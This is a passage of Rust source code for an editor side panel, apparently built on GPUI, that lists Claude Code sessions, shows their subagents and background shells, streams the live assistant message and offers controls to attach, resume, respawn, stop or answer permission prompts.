        // draws it outside the item's left edge — off the panel entirely for a row at the
        // top level of the list.
        let start_slot = h_flex()
            .gap_0p5()
            .children(agents_shown.map(|shown| {
                Disclosure::new(
                    SharedString::from(format!("claude-session-agents-{index}")),
                    shown,
                )
                .on_click({
                    let session_id = session_id.clone();
                    cx.listener(move |this, _, _, cx| {
                        this.toggle_session_agents(session_id.clone(), cx)
                    })
                })
            }))
            .child(indicator);

        ListItem::new(SharedString::from(format!("claude-session-{index}")))
            .spacing(ListItemSpacing::Sparse)
            .toggle_state(is_selected)
            .start_slot(start_slot)
            .child(
                v_flex()
                    .gap_0p5()
                    .overflow_hidden()
                    .child(
                        h_flex()
                            .gap_1()
                            .children(tmux_session.map(|tmux_session| {
                                Label::new(tmux_session)
                                    .size(LabelSize::Small)
                                    .color(Color::Muted)
                                    .single_line()
                            }))
                            .child(Label::new(name).size(LabelSize::Small).single_line())
                            .when(is_bridged, |this| {
                                this.child(
                                    Icon::new(IconName::Link)
                                        .size(IconSize::XSmall)
                                        .color(Color::Accent),
                                )
                            })
                            .children(context.map(|context| {
                                Label::new(context)
                                    .size(LabelSize::XSmall)
                                    .color(Color::Muted)
                                    .single_line()
                            }))
                            .children(cost.map(|cost| {
                                Label::new(cost).size(LabelSize::XSmall).color(Color::Muted)
                            })),
                    )
                    .child(
                        h_flex()
                            .gap_1()
                            .overflow_hidden()
                            .child(
                                Label::new(working_directory)
                                    .size(LabelSize::XSmall)
                                    .color(Color::Muted)
                                    .single_line(),
                            )
                            .children(idle.map(|idle| {
                                Label::new(idle)
                                    .size(LabelSize::XSmall)
                                    .color(Color::Hidden)
                                    .single_line()
                            }))
                            .children(waiting_for.as_ref().map(|waiting_for| {
                                Label::new(SharedString::from(format!("waiting: {waiting_for}")))
                                    .size(LabelSize::XSmall)
                                    .color(Color::Warning)
                                    .single_line()
                            })),
                    ),
            )
            .end_slot(self.live_row_actions(
                index,
                &session_id,
                background,
                agent_id.as_deref(),
                tmux_target.as_deref(),
                &cwd,
                claude_ai_url,
                cx,
            ))
            .tooltip(Tooltip::text(if process_id == 0 {
                format!("session {session_id}")
            } else {
                format!("pid {process_id}")
            }))
            .on_click({
                let session_id = session_id.clone();
                cx.listener(move |this, _, window, cx| {
                    this.select_session(session_id.clone(), cx);
                    this.reveal_in_pane(
                        Some(session_id.clone()),
                        TranscriptTarget::Main,
                        window,
                        cx,
                    );
                })
            })
    }

    fn render_ended_session_row(
        &self,
        index: usize,
        ended: &EndedSession,
        is_selected: bool,
        cx: &mut Context<Self>,
    ) -> ListItem {
        let session_id = ended.session_id.clone();
        let name = SharedString::from(preferred_name(
            ended.ai_title.as_deref(),
            ended.name.as_deref(),
            ended.session_id.as_str(),
        ));
        let working_directory = self.display_working_directory(&ended.cwd);
        let reason = match ended.ended_reason {
            EndedReason::ProcessGone => "ended",
            EndedReason::Cleared => "cleared",
        };
        let tmux_session = ended
            .tmux
            .as_deref()
            .and_then(tmux_session_name)
            .map(|name| SharedString::from(format!("[{name}]")));
        let cwd = ended.cwd.clone();
        let tmux_target = ended.tmux.clone();
        let bridge_session_id = ended.bridge_session_id.clone();

        ListItem::new(SharedString::from(format!("claude-session-ended-{index}")))
            .spacing(ListItemSpacing::Sparse)
            .toggle_state(is_selected)
            .start_slot(
                Icon::new(IconName::Close)
                    .size(IconSize::XSmall)
                    .color(Color::Muted),
            )
            .child(
                v_flex()
                    .gap_0p5()
                    .overflow_hidden()
                    .child(
                        h_flex()
                            .gap_1()
                            .children(tmux_session.map(|tmux_session| {
                                Label::new(tmux_session)
                                    .size(LabelSize::Small)
                                    .color(Color::Muted)
                                    .single_line()
                            }))
                            .child(Label::new(name).size(LabelSize::Small).single_line())
                            .child(
                                Label::new(reason)
                                    .size(LabelSize::XSmall)
                                    .color(Color::Muted)
                                    .single_line(),
                            ),
                    )
                    .child(
                        Label::new(working_directory)
                            .size(LabelSize::XSmall)
                            .color(Color::Muted)
                            .single_line(),
                    ),
            )
            .end_slot(self.ended_row_actions(
                index,
                &session_id,
                &cwd,
                tmux_target.as_deref(),
                bridge_session_id.as_deref(),
                cx,
            ))
            .on_click({
                let session_id = session_id.clone();
                cx.listener(move |this, _, window, cx| {
                    this.select_session(session_id.clone(), cx);
                    this.reveal_in_pane(
                        Some(session_id.clone()),
                        TranscriptTarget::Main,
                        window,
                        cx,
                    );
                })
            })
    }

    fn live_row_actions(
        &self,
        index: usize,
        _session_id: &str,
        background: bool,
        agent_id: Option<&str>,
        tmux_target: Option<&str>,
        cwd: &Path,
        claude_ai_url: Option<String>,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let stop_armed = agent_id.is_some_and(|agent_id| self.stop_is_armed(agent_id));
        h_flex()
            .gap_0p5()
            .children(claude_ai_url.map(|url| {
                IconButton::new(
                    SharedString::from(format!("claude-session-open-ai-{index}")),
                    IconName::ArrowUpRight,
                )
                .icon_size(IconSize::XSmall)
                .tooltip(Tooltip::text("Open in claude.ai"))
                .on_click(move |_, _, cx| {
                    cx.open_url(&url);
                })
            }))
            .children(tmux_target.and_then(tmux_session_name).map(|name| {
                let name = name.to_string();
                Button::new(
                    SharedString::from(format!("claude-session-open-tmux-{index}")),
                    "Open in tmux",
                )
                .label_size(LabelSize::XSmall)
                .on_click(cx.listener(move |this, _, window, cx| {
                    this.spawn_in_terminal(
                        format!("tmux: {name}"),
                        tmux_attach_command(&name, None),
                        None,
                        window,
                        cx,
                    );
                }))
            }))
            .when(background, |this| {
                this.children(agent_id.map(|agent_id| {
                    let agent_id = agent_id.to_string();
                    let cwd = cwd.to_path_buf();
                    h_flex()
                        .gap_0p5()
                        .child(
                            Button::new(
                                SharedString::from(format!("claude-session-attach-{index}")),
                                "Attach",
                            )
                            .label_size(LabelSize::XSmall)
                            .on_click({
                                let agent_id = agent_id.clone();
                                let cwd = cwd.clone();
                                cx.listener(move |this, _, window, cx| {
                                    let Some(command) = attach_command(&agent_id) else {
                                        this.lifecycle_note = Some(SharedString::from(format!(
                                            "{agent_id} is not an id this can attach to."
                                        )));
                                        cx.notify();
                                        return;
                                    };
                                    this.spawn_in_terminal(
                                        command.clone(),
                                        command,
                                        Some(cwd.clone()),
                                        window,
                                        cx,
                                    );
                                })
                            }),
                        )
                        .child(
                            Button::new(
                                SharedString::from(format!("claude-session-respawn-{index}")),
                                "Respawn",
                            )
                            .label_size(LabelSize::XSmall)
                            .on_click({
                                let agent_id = agent_id.clone();
                                let cwd = cwd.clone();
                                cx.listener(move |this, _, _, cx| {
                                    this.run_agent_command(
                                        vec!["respawn".to_string(), agent_id.clone()],
                                        cwd.clone(),
                                        cx,
                                    );
                                })
                            }),
                        )
                        .child(
                            Button::new(
                                SharedString::from(format!("claude-session-stop-{index}")),
                                if stop_armed { "Confirm stop" } else { "Stop" },
                            )
                            .label_size(LabelSize::XSmall)
                            .on_click(cx.listener(
                                move |this, _, _, cx| {
                                    this.arm_or_stop(agent_id.clone(), cwd.clone(), cx);
                                },
                            )),
                        )
                }))
            })
            .into_any_element()
    }

    fn ended_row_actions(
        &self,
        index: usize,
        session_id: &str,
        cwd: &Path,
        tmux_target: Option<&str>,
        bridge_session_id: Option<&str>,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let claude_ai_url = self.claude_ai_url_for(session_id, bridge_session_id, cx);
        h_flex()
            .gap_0p5()
            .child({
                let session_id = session_id.to_string();
                let cwd = cwd.to_path_buf();
                Button::new(
                    SharedString::from(format!("claude-session-resume-{index}")),
                    "Resume",
                )
                .label_size(LabelSize::XSmall)
                .on_click(cx.listener(move |this, _, _, cx| {
                    this.resume_ended_session(session_id.clone(), cwd.clone(), cx);
                }))
            })
            .children(claude_ai_url.map(|url| {
                Button::new(
                    SharedString::from(format!("claude-session-ended-open-ai-{index}")),
                    "Open in claude.ai",
                )
                .label_size(LabelSize::XSmall)
                .on_click(move |_, _, cx| {
                    cx.open_url(&url);
                })
            }))
            .children(tmux_target.and_then(tmux_session_name).map(|name| {
                let name = name.to_string();
                Button::new(
                    SharedString::from(format!("claude-session-ended-tmux-{index}")),
                    "Open in tmux",
                )
                .label_size(LabelSize::XSmall)
                .on_click(cx.listener(move |this, _, window, cx| {
                    this.spawn_in_terminal(
                        format!("tmux: {name}"),
                        tmux_attach_command(&name, None),
                        None,
                        window,
                        cx,
                    );
                }))
            }))
            .child({
                let session_id = session_id.to_string();
                Button::new(
                    SharedString::from(format!("claude-session-dismiss-{index}")),
                    "Dismiss",
                )
                .label_size(LabelSize::XSmall)
                .on_click(cx.listener(move |this, _, _, cx| {
                    this.store
                        .update(cx, |store, cx| store.dismiss_ended(&session_id, cx));
                    cx.notify();
                }))
            })
            .into_any_element()
    }

    fn claude_ai_url_for(
        &self,
        session_id: &str,
        registry_bridge: Option<&str>,
        cx: &App,
    ) -> Option<String> {
        let store = self.store.read(cx);
        let from_transcript = (store.selected() == Some(session_id))
            .then(|| store.main_transcript().bridge_session_id())
            .flatten();
        claude_ai_session_url(registry_bridge.or(from_transcript))
    }

    #[cfg(test)]
    fn ended_row_action_labels(ended: &EndedSession) -> Vec<&'static str> {
        let mut labels = vec!["Resume"];
        if ended
            .bridge_session_id
            .as_deref()
            .is_some_and(|id| !id.trim().is_empty())
        {
            labels.push("Open in claude.ai");
        }
        if ended.tmux.as_deref().and_then(tmux_session_name).is_some() {
            labels.push("Open in tmux");
        }
        labels.push("Dismiss");
        labels
    }

    #[cfg(test)]
    fn background_row_action_labels(live: &LiveSession) -> Vec<&'static str> {
        if !live.background || live.agent_id.is_none() {
            return Vec::new();
        }
        vec!["Attach", "Respawn", "Stop"]
    }

    fn stop_is_armed(&self, agent_id: &str) -> bool {
        self.stop_armed_until_ms
            .as_ref()
            .is_some_and(|(id, until)| id == agent_id && now_millis() < *until)
    }

    fn arm_or_stop(&mut self, agent_id: String, cwd: PathBuf, cx: &mut Context<Self>) {
        if self.stop_is_armed(&agent_id) {
            self.stop_armed_until_ms = None;
            self.run_agent_command(vec!["stop".to_string(), agent_id], cwd, cx);
            return;
        }
        self.stop_armed_until_ms = Some((agent_id, now_millis().saturating_add(STOP_ARM_MS)));
        cx.notify();
    }

    fn resume_ended_session(&mut self, session_id: String, cwd: PathBuf, cx: &mut Context<Self>) {
        let resume = self.source.resume_session_in_background(session_id, cwd);
        self._lifecycle_command = cx.spawn(async move |this, cx| {
            let result = resume.await;
            this.update(cx, |this, cx| {
                this.lifecycle_note = Some(match result {
                    Ok(output) => SharedString::from(output),
                    Err(error) => SharedString::from(format!("Resume failed: {error:#}")),
                });
                cx.notify();
            })
            .log_err();
        });
    }

    fn run_agent_command(&mut self, args: Vec<String>, cwd: PathBuf, cx: &mut Context<Self>) {
        let run = self.source.run_claude_agent_command(args, cwd);
        self._lifecycle_command = cx.spawn(async move |this, cx| {
            let result = run.await;
            this.update(cx, |this, cx| {
                this.lifecycle_note = Some(match result {
                    Ok(output) => SharedString::from(output),
                    Err(error) => SharedString::from(format!("{error:#}")),
                });
                cx.notify();
            })
            .log_err();
        });
    }

    fn spawn_in_terminal(
        &mut self,
        label: String,
        command: String,
        cwd: Option<PathBuf>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let Some(workspace) = self.workspace.upgrade() else {
            self.lifecycle_note = Some(SharedString::from("The workspace is not available."));
            cx.notify();
            return;
        };
        let Some(terminal_panel) = workspace.read(cx).panel::<TerminalPanel>(cx) else {
            self.lifecycle_note = Some(SharedString::from("The terminal panel is not available."));
            cx.notify();
            return;
        };

        let spawn = SpawnInTerminal {
            id: TaskId(format!("claude-session-{label}")),
            full_label: label.clone(),
            label,
            command: Some(command.clone()),
            command_label: command,
            use_new_terminal: true,
            allow_concurrent_runs: true,
            reveal: RevealStrategy::Always,
            cwd,
            ..Default::default()
        };
        let spawned = terminal_panel.update(cx, |terminal_panel, cx| {
            terminal_panel.spawn_task(&spawn, window, cx)
        });
        self._lifecycle_command = cx.spawn(async move |this, cx| {
            if let Err(error) = spawned.await {
                this.update(cx, |this, cx| {
                    this.lifecycle_note =
                        Some(SharedString::from(format!("Opening a terminal: {error:#}")));
                    cx.notify();
                })
                .log_err();
            }
        });
    }

    fn set_store_visible(&mut self, visible: bool, cx: &mut Context<Self>) {
        self.store.update(cx, |store, _| store.set_visible(visible));
    }

    /// The row of conversations the selected session has to offer: its own, then one chip
    /// per agent it has spawned.
    ///
    /// `None` when there is nothing to choose between — no session, or a session that has
    /// spawned nothing — so that the row does not take a line of the panel from the
    /// conversation for the sake of a single chip.
    fn render_agent_chips(&mut self, cx: &mut Context<Self>) -> Option<AnyElement> {
        // Read out whole before any listener is built: the store's borrow and the
        // `cx.listener` calls below cannot be held at the same time.
        let (subagents, target, states, shells) = {
            let store = self.store.read(cx);
            store.selected()?;
            let target = store.transcript_target().clone();
            // The states come off the session's own conversation, which is followed
            // whichever one is on screen, so a chip stays truthful while its own agent's
            // records are the ones being drawn.
            let main_transcript = store.main_transcript();
            let main_path = main_transcript.active_path();
            let subagents: Vec<SubagentSummary> = store
                .subagents()
                .iter()
                .filter(|summary| agent_row_is_offered(summary, &main_path, &target))
                .cloned()
                .collect();
            let states: Vec<AgentState> = subagents
                .iter()
                .map(|summary| agent_state(summary, &main_path))
                .collect();
            let shells: Vec<BackgroundShell> = background_shells(&main_transcript.full_path())
                .into_iter()
                .filter(|shell| !shell.finished)
                .collect();
            (subagents, target, states, shells)
        };
        let pending_agents = self.pending_background_agents().unwrap_or(0);

        if subagents.is_empty()
            && shells.is_empty()
            && pending_agents == 0
            && target == TranscriptTarget::Main
        {
            return None;
        }

        let mut row = h_flex()
            .id("claude-session-agent-chips")
            .w_full()
            .flex_none()
            .px_2()
            .py_1()
            .gap_1()
            // The chips are as many as the session has spawned, which is more than fits
            // across a side panel; scrolling them keeps the panel its own width.
            .overflow_x_scroll()
            .child(self.render_agent_chip(
                "main",
                SharedString::from(MAIN_CONVERSATION_CHIP),
                None,
                target == TranscriptTarget::Main,
                false,
                Some(TranscriptTarget::Main),
                cx,
            ));

        for (index, summary) in subagents.iter().enumerate() {
            let chip_target = TranscriptTarget::Subagent {
                agent_id: summary.agent_id.clone(),
                workflow_run_id: summary.workflow_run_id.clone(),
            };
            let is_selected = target == chip_target;
            let is_running = states.get(index).copied() == Some(AgentState::Running);
            row = row.child(self.render_agent_chip(
                &format!("agent-{index}"),
                agent_chip_label(summary),
                Some(agent_chip_tooltip(summary)),
                is_selected,
                is_running,
                Some(chip_target),
                cx,
            ));
        }

        // Last in the row, after everything that opens a conversation: a shell chip is a
        // label rather than a tab, and one sitting among the tabs would read as a tab that
        // refuses to open. It pulses because only the shells still running are drawn.
        for (index, shell) in shells.iter().enumerate() {
            row = row.child(self.render_agent_chip(
                &format!("shell-{index}"),
                shell.label.clone(),
                Some(background_shell_tooltip(shell)),
                false,
                true,
                None,
                cx,
            ));
        }

        if pending_agents > 0 {
            row = row.child(
                Label::new(if pending_agents == 1 {
                    SharedString::from("1 agent still running")
                } else {
                    SharedString::from(format!("{pending_agents} agents still running"))
                })
                .size(LabelSize::XSmall)
                .color(Color::Muted),
            );
        }

        Some(row.into_any_element())
    }

    /// One chip. Clicking one opens that conversation as a tab of its own rather than
    /// retargeting this one: a run of several agents is watched beside the conversation
    /// that started it, and a tab that swapped what it was showing under the reader would
    /// make watching two of them impossible.
    ///
    /// `None` as the target is a chip that names something with no conversation to open —
    /// a background shell, whose output goes to a file. It is drawn as the others are so
    /// that the row reads as one list of what the session is running.
    fn render_agent_chip(
        &self,
        id: &str,
        label: SharedString,
        tooltip: Option<SharedString>,
        is_selected: bool,
        is_running: bool,
        target: Option<TranscriptTarget>,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let button = Button::new(
            SharedString::from(format!("claude-session-chip-{id}")),
            label,
        )
        .label_size(LabelSize::XSmall)
        .color(if is_running {
            Color::Default
        } else {
            Color::Muted
        })
        .toggle_state(is_selected)
        .selected_style(ButtonStyle::Tinted(TintColor::Accent))
        .when_some(tooltip, |this, tooltip| {
            this.tooltip(Tooltip::text(tooltip))
        })
        .when_some(target, |this, target| {
            this.on_click(cx.listener(move |this, _, window, cx| {
                this.open_agent_in_pane(target.clone(), window, cx)
            }))
        });

        if !is_running {
            return button.into_any_element();
        }

        // Wrapped so that the pulse applies to the element: the icon itself carries a
        // colour rather than an opacity.
        let indicator = div()
            .child(
                Icon::new(IconName::Indicator)
                    .size(IconSize::XSmall)
                    .color(Color::Success),
            )
            .with_animation(
                SharedString::from(format!("claude-session-chip-pulse-{id}")),
                Animation::new(PULSE_PERIOD)
                    .repeat()
                    .with_easing(pulsating_between(0.2, 0.8)),
                |indicator, delta| indicator.opacity(delta),
            );

        h_flex()
            .flex_none()
            .gap_0p5()
            .child(indicator)
            .child(button)
            .into_any_element()
    }

    /// The agents one call started, as the card under that call draws them. Empty for a
    /// call this panel cannot pair with anything on disk: a card saying nothing about an
    /// agent is worse than no card.
    fn agent_cards(&self, key: &SharedString, cx: &Context<Self>) -> Vec<AgentCardRow> {
        let Some(call) = self.agent_calls.get(key) else {
            return Vec::new();
        };

        let store = self.store.read(cx);
        let main_path = store.main_transcript().active_path();
        let open_target = store.transcript_target();
        subagents_of_call(call, store.subagents(), &main_path)
            .into_iter()
            .map(|summary| AgentCardRow {
                label: agent_chip_label(summary),
                state: agent_state(summary, &main_path),
                offered: agent_row_is_offered(summary, &main_path, open_target),
                phase: summary
                    .meta
                    .workflow_phase
                    .as_deref()
                    .map(str::trim)
                    .filter(|phase| !phase.is_empty())
                    .map(|phase| SharedString::from(phase.to_string())),
                target: TranscriptTarget::Subagent {
                    agent_id: summary.agent_id.clone(),
                    workflow_run_id: summary.workflow_run_id.clone(),
                },
            })
            .collect()
    }

    fn render_agent_card(
        &self,
        key: &SharedString,
        index: usize,
        card: AgentCardRow,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let (state_note, state_color) = match card.state {
            AgentState::Running => ("Running", Color::Success),
            AgentState::Finished => ("Finished", Color::Muted),
        };
        // An agent that recorded no phase says nothing about one: a card reading
        // `Running · unknown` is less than a card reading `Running`.
        let state_note = match card.phase {
            Some(phase) => SharedString::from(format!("{state_note} · {phase}")),
            None => SharedString::from(state_note),
        };
        let target = card.target;

        h_flex()
            .w_full()
            .px_2()
            .pb_1()
            .gap_1()
            .justify_between()
            .child(
                v_flex()
                    .overflow_hidden()
                    .child(Label::new(card.label).size(LabelSize::XSmall).single_line())
                    .child(
                        Label::new(state_note)
                            .size(LabelSize::XSmall)
                            .color(state_color),
                    ),
            )
            // A run of several agents is worth watching beside the conversation that
            // started it, rather than in place of it, so the one thing the card offers is
            // a tab of the agent's own. Offered from a tab as well as from the dock: a tab
            // reading one agent is what the reader opens the next one from.
            .child(
                Button::new(
                    SharedString::from(format!("claude-session-open-agent-{key}-{index}")),
                    "Open",
                )
                .end_icon(Icon::new(IconName::ArrowUpRight).size(IconSize::XSmall))
                .label_size(LabelSize::XSmall)
                .tooltip(Tooltip::text("Read this agent in a tab of its own"))
                .on_click(cx.listener(move |this, _, window, cx| {
                    this.open_agent_in_pane(target.clone(), window, cx)
                })),
            )
            .into_any_element()
    }

    /// What the session is saying right now, drawn under the conversation until the
    /// conversation itself has it.
    ///
    /// The CLI does not write an assistant message into its transcript until the turn
    /// carrying it is over, so on a long turn the panel is tens of seconds behind the
    /// terminal. This is the same words, read from what the terminal drew.
    ///
    /// Drawn below the conversation rather than spliced into it: the words change several
    /// times a second while the turn runs, and an entry in the list would remeasure the
    /// whole conversation each time.
    fn render_live_message(
        &mut self,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Option<AnyElement> {
        let now_ms = now_millis();
        let (is_main, visible, message_id, text, is_final) = {
            let store = self.store.read(cx);
            let is_main = matches!(store.transcript_target(), TranscriptTarget::Main);
            let live = store.live();
            let visible = is_main && live_message_is_visible(live, now_ms);
            let message = live.live_message.as_ref();
            (
                is_main,
                visible,
                message.and_then(|message| message.message_id.clone()),
                message.map(|message| message.text.clone()),
                message.is_some_and(|message| message.is_final),
            )
        };
        if !is_main || !visible {
            self.forget_live_message_markdown();
            return None;
        }
        let text = text?;
        let already_in_the_conversation = self.entries.iter().rev().take(8).any(|entry| {
            matches!(
                &entry.kind,
                EntryKind::Message {
                    role: MessageRole::Assistant,
                    source,
                    ..
                } if source.trim() == text.trim()
            )
        });
        if already_in_the_conversation {
            self.forget_live_message_markdown();
            return None;
        }

        let markdown_key = live_message_markdown_key(message_id.as_deref());
        if self.live_message_markdown_key.as_ref() != Some(&markdown_key) {
            self.forget_live_message_markdown();
            self.live_message_markdown_key = Some(markdown_key.clone());
        }
        let source = SharedString::from(text);
        let markdown = self.markdown_for(&markdown_key, source, cx);
        let header = if is_final { "Said" } else { "Saying…" };
        let header_color = if is_final {
            Color::Muted
        } else {
            Color::Default
        };
        let height = clamp_live_message_height(
            self.live_message_height,
            window.rem_size(),
            window.bounds().size.height,
        );
        self.live_message_height = height;

        Some(
            v_flex()
                .w_full()
                .flex_none()
                .h(height)
                .max_h(relative(LIVE_MESSAGE_HEIGHT_PANEL_FRACTION))
                .border_t_1()
                .border_color(cx.theme().colors().border)
                .on_drag_move::<DraggedLiveMessageDivider>(cx.listener(
                    |this, event, window, cx| this.on_live_message_drag_move(event, window, cx),
                ))
                .on_drop::<DraggedLiveMessageDivider>(cx.listener(|this, _, _, cx| {
                    this.live_message_drag = None;
                    cx.notify();
                }))
                .child(
                    div()
                        .id("claude-session-live-message-resize")
                        .w_full()
                        .h_1()
                        .cursor_row_resize()
                        .on_drag(DraggedLiveMessageDivider, |_, _, _, cx| cx.new(|_| Empty)),
                )
                .child(
                    div().px_2().child(
                        Label::new(header)
                            .size(LabelSize::XSmall)
                            .color(header_color),
                    ),
                )
                .child(
                    div()
                        .id("claude-session-live-message")
                        .w_full()
                        .flex_1()
                        .min_h_0()
                        .px_2()
                        .pb_1()
                        .overflow_y_scroll()
                        .track_scroll(&self.live_message_scroll)
                        .child(MarkdownElement::new(markdown, markdown_style(window, cx)))
                        .custom_scrollbars(
                            Scrollbars::new(ScrollAxes::Vertical)
                                .tracked_scroll_handle(&self.live_message_scroll),
                            window,
                            cx,
                        ),
                )
                .into_any_element(),
        )
    }

    /// Keeps the newest of what the session is saying in view.
    ///
    /// The words arrive a few at a time into a box that is only a few lines tall, so
    /// without this the reader watches the opening of a message that is being written
    /// somewhere below the fold. A reader who has scrolled away from the end is left
    /// where they put themselves: they are reading something, and until the turn lands in
    /// the conversation this box is the only place those words exist.
    fn follow_the_live_message(&mut self, cx: &Context<Self>) {
        let identity = self
            .store
            .read(cx)
            .live()
            .live_message
            .as_ref()
            .map(|live_message| (live_message.message_id.clone(), live_message.text.len()));
        if identity == self.live_message_identity {
            return;
        }

        let scroll = &self.live_message_scroll;
        let was_at_the_end =
            scroll.max_offset().y + scroll.offset().y < px(LIVE_MESSAGE_TAIL_PIXELS);
        self.live_message_identity = identity.clone();
        self.live_message_length = identity.as_ref().map(|(_, length)| *length).unwrap_or(0);
        if was_at_the_end {
            scroll.scroll_to_bottom();
        }
    }

    fn render_now_row(
        &mut self,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Option<AnyElement> {
        let row = {
            let store = self.store.read(cx);
            if !matches!(store.transcript_target(), TranscriptTarget::Main) {
                return None;
            }
            now_row(store.live(), &self.activity)
        }?;
        let now_ms = now_millis();
        let narrow = panel_is_narrow(window);
        let (icon, title, target, elapsed, pulse) = match &row {
            NowRow::Tool {
                name,
                target,
                started_at_ms,
                ..
            } => {
                let elapsed = started_at_ms.map(|started_at_ms| {
                    format_elapsed_mm_ss(now_ms.saturating_sub(started_at_ms))
                });
                let target = if narrow && !target.is_empty() {
                    SharedString::from(truncate_and_trailoff(target, 18))
                } else {
                    target.clone()
                };
                (IconName::ToolHammer, name.clone(), target, elapsed, true)
            }
            NowRow::Thinking { since_ms } => {
                let elapsed =
                    since_ms.map(|since_ms| format_elapsed_mm_ss(now_ms.saturating_sub(since_ms)));
                (
                    IconName::ToolThink,
                    SharedString::from(THINKING_NOTE),
                    SharedString::from(""),
                    elapsed,
                    true,
                )
            }
        };

        let mut header = h_flex()
            .id("claude-session-now-row")
            .w_full()
            .px_2()
            .py_0p5()
            .gap_1()
            .cursor_pointer()
            .on_click(cx.listener(|this, _, _, cx| this.toggle_now_row(cx)))
            .child(Icon::new(icon).size(IconSize::XSmall).color(Color::Accent))
            .child(
                Label::new(title)
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .single_line(),
            );
        if !target.is_empty() {
            header = header.child(
                Label::new(target)
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .single_line(),
            );
        }
        if let Some(elapsed) = elapsed {
            header = header.child(
                Label::new(elapsed)
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .single_line(),
            );
        }
        if pulse {
            header = header.child(
                div()
                    .w_1p5()
                    .h_1p5()
                    .rounded_full()
                    .bg(cx.theme().colors().text_accent)
                    .with_animation(
                        "claude-session-now-row-dot",
                        Animation::new(PULSE_PERIOD)
                            .repeat()
                            .with_easing(pulsating_between(0.2, 0.8)),
                        |dot, delta| dot.opacity(delta),
                    ),
            );
        }

        let mut column = v_flex().w_full().flex_none().child(header);
        if self.now_row_expanded {
            column = column.children(self.render_now_row_expansion(&row, window, cx));
        }
        Some(column.into_any_element())
    }

    fn render_now_row_expansion(
        &mut self,
        row: &NowRow,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Vec<AnyElement> {
        let NowRow::Tool {
            tool_use_id,
            name,
            input,
            ..
        } = row
        else {
            return Vec::new();
        };

        let mut cards = Vec::new();
        let matching =
            self.entries
                .iter()
                .enumerate()
                .find_map(|(index, entry)| match &entry.kind {
                    EntryKind::ToolUse { id, .. }
                        if id.as_deref() == Some(tool_use_id.as_str())
                            && !tool_use_id.is_empty() =>
                    {
                        Some(index)
                    }
                    _ => None,
                });
        if let Some(index) = matching {
            cards.push(self.render_entry(index, window, cx));
            if let Some(result_index) = index.checked_add(1)
                && matches!(
                    self.entries.get(result_index).map(|entry| &entry.kind),
                    Some(EntryKind::ToolResult { .. })
                )
            {
                cards.push(self.render_entry(result_index, window, cx));
            }
            return cards;
        }

        let input_text = SharedString::from(input.to_string());
        cards.push(self.render_tool_use(
            self.entries.len(),
            SharedString::from(NOW_ROW_ENTRY_KEY),
            name.clone(),
            input_text,
            (!tool_use_id.is_empty()).then(|| SharedString::from(tool_use_id.clone())),
            None,
            true,
            window,
            cx,
        ));
        cards
    }

    fn render_transcript_section(
        &mut self,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let store = self.store.read(cx);
        let has_selection = store.selected().is_some();
        let has_transcript_file = store.transcript_path().is_some();

        if !has_selection {
            return Self::render_placeholder(SELECT_A_SESSION);
        }

        if self.entries.is_empty() {
            return Self::render_placeholder(if has_transcript_file {
                EMPTY_TRANSCRIPT
            } else {
                WAITING_FOR_TRANSCRIPT
            });
        }

        // Arriving back at the bottom is having read what landed there, and this is where
        // a scroll that got there is noticed: the list notifies this view on every
        // scroll, so the panel is drawn again with the answer below already updated.
        // `None` — a list whose new items have not been measured yet, which is exactly
        // what a splice leaves behind — is not an answer, and clearing the count on it
        // would throw away the arrival that caused the splice.
        if let Some(at_end) = self.list_state.is_scrolled_to_end() {
            self.scrolled_to_end = at_end;
            if at_end {
                self.unread_below.scrolled(true);
            }
        }
        let unread_below = self.unread_below.count();

        v_flex()
            .flex_grow_1()
            .flex_shrink_1()
            .min_h(rems(CONVERSATION_MIN_HEIGHT_REMS))
            .overflow_hidden()
            .child(
                list(
                    self.list_state.clone(),
                    cx.processor(|this, index: usize, window, cx| {
                        this.render_entry(index, window, cx)
                    }),
                )
                .with_sizing_behavior(ListSizingBehavior::Auto)
                .flex_grow_1(),
            )
            .custom_scrollbars(
                Scrollbars::new(ScrollAxes::Vertical)
                    .tracked_scroll_handle(&self.list_state)
                    .thumb_color(CONVERSATION_SCROLLBAR_COLOR),
                window,
                cx,
            )
            // A reader who has scrolled up is not followed to the tail, so the messages
            // that arrive land out of sight and the session looks like it has stopped.
            // This is the only sign that it has not.
            .when(unread_below > 0, |this| {
                this.child(
                    h_flex().w_full().px_2().pb_1().justify_center().child(
                        Button::new(
                            "claude-session-scroll-to-latest",
                            // Counted in entries rather than messages, because one
                            // reply arrives as several of them: thinking, a tool call,
                            // its result, then the text. Saying "messages" would name a
                            // number the reader cannot match to what they scroll past.
                            if unread_below == 1 {
                                "1 new below".to_string()
                            } else {
                                format!("{unread_below} new below")
                            },
                        )
                        .end_icon(Icon::new(IconName::ArrowDown).size(IconSize::XSmall))
                        .label_size(LabelSize::XSmall)
                        .tooltip(Tooltip::text("Jump to the newest message"))
                        .on_click(cx.listener(|this, _, _, cx| this.scroll_to_latest(cx))),
                    ),
                )
            })
            .children(self.render_now_row(window, cx))
            .into_any_element()
    }

    fn render_placeholder(message: &'static str) -> AnyElement {
        div()
            .flex_grow_1()
            .p_2()
            .child(
                Label::new(message)
                    .size(LabelSize::Small)
                    .color(Color::Muted),
            )
            .into_any_element()
    }

    fn answer_permission(&mut self, allow: bool, cx: &mut Context<Self>) {
        if self.permission_answered {
            return;
        }
        let answering = self
            .store
            .read(cx)
            .live()
            .pending_permission
            .as_ref()
            .map(|permission| SharedString::from(permission.tool_use_id.clone()));
        let send = self
            .store
            .update(cx, |store, cx| store.answer_permission(allow, cx));
        self.permission_answered = true;
        self.permission_answered_for = answering;
        cx.notify();
        cx.spawn(async move |this, cx| {
            let outcome = send.await;
            this.update(cx, |this, cx| {
                if outcome.is_err() {
                    this.permission_answered = false;
                    this.permission_answered_for = None;
                }
                cx.notify();
            })
            .log_err();
        })
        .detach();
    }

    /// The one control the conversation needs of its own: whether the session's tool
